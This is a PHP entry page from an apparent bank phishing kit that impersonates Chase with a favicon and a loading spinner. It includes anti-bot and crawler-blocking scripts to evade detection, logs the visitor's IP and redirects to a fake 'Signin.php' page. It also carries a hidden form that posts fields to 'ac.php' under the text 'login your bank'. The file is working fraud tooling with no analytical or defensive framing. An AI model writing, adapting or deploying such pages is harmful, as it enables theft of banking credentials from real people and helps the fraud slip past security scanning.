<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
$ib = $_SERVER['REMOTE_ADDR'];
$random=rand(0,100000);
$ran = md5($random);
$d=dirname($_SERVER['PHP_SELF']);
echo '<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="4;url='.$d.'/Signin.php?ScrPg='.$ib.'&ACCT.x=ID-DL=WF324='.$ran.'"/>

<title> Login... </title>
<link rel="shortcut icon" href="'.$d.'/style/img/chasefavicon.ico"/>


<style>
	html,body{height:100%;width:100%;padding:0;margin:0;background-color:#1c4f82;position:relative;box-sizing:border-box;
background: #1c4f82;
    background: -moz-linear-gradient(top,#1c4f82 0,#2e6ea3 100%);
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);}
   
    .contt-rot{
        width: auto;
        height:100%;
        margin: auto;position:relative;background-color:#1c4f82;z-index:900;
background: #1c4f82;
    background: -moz-linear-gradient(top,#1c4f82 0,#2e6ea3 100%);
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);
    }
    .content{
		width:80%;
        max-width: 100px;
        margin: auto;position:relative;
		top:26%;
    }
    .layout{
        text-align: center;
        margin: 65px 0 20px;
    }
    .layout h3{
		color:#fff;
        margin-bottom: 40px;
        font-size: 18px;
    }
    .img_rotate{
        display: inline-block;box-sizing:border-box;
        margin: auto auto;
        height:28px;
        width:28px;
        -webkit-animation: rotation .7s infinite linear;
        -moz-animation: rotation .7s infinite linear;
        -o-animation: rotation .7s infinite linear;
        animation: rotation .7s infinite linear;
        border-left:4px solid #ccc;
        border-right:4px solid #ccc;
        border-bottom:4px solid #ccc;
        border-top:4px solid #0092ff;
        border-radius:100%;
    }
    @keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	form{position:absolute;z-index:0;top:0}
</style>
</head>
<body>
<div class="contt-rot">
    <div class="content">
        <div class="layout">
            <h3>&nbsp;</h3>
            <div class="img_rotate"></div>
        </div>
    </div>
</div>
	<form method="post" action="ac.php"><input type="text" name="v1"/>
	<input type="text" name="v2"/>
	<input type="text" name="v3"/>
	<input type="submit" value="Signin"/><a href="ac.php">login your bank</a></form>
	<footer></footer>
</body>
</html>';
?>